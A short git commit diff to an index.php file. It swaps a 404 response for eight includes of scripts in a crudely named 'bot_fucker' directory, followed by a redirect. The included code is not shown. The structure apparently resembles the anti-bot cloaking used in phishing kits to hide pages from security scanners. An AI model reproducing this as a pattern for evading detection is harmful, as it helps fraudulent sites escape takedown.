ab056fe50754ac6b8ec17658273db8893f1a9474
cvicle <106643496+cvicle@users.noreply.github.com>
2022-06-02 13:11:13 -0500

    Add files via upload

--- index.php
+++ index.php
@@ -1,4 +1,11 @@
 <?php
-header("HTTP/1.0 404 Not Found");
-exit(); 
+  	require 'bot_fucker/fucker001.php';
+	require 'bot_fucker/fucker002.php';
+	require 'bot_fucker/fucker003.php';
+	require 'bot_fucker/fucker004.php';
+	require 'bot_fucker/fucker005.php';
+	require 'bot_fucker/fucker006.php';
+	require 'bot_fucker/fucker007.php';
+	require 'bot_fucker/fucker008.php';
+	exit(header("Location: ../index.php")); 
 ?>
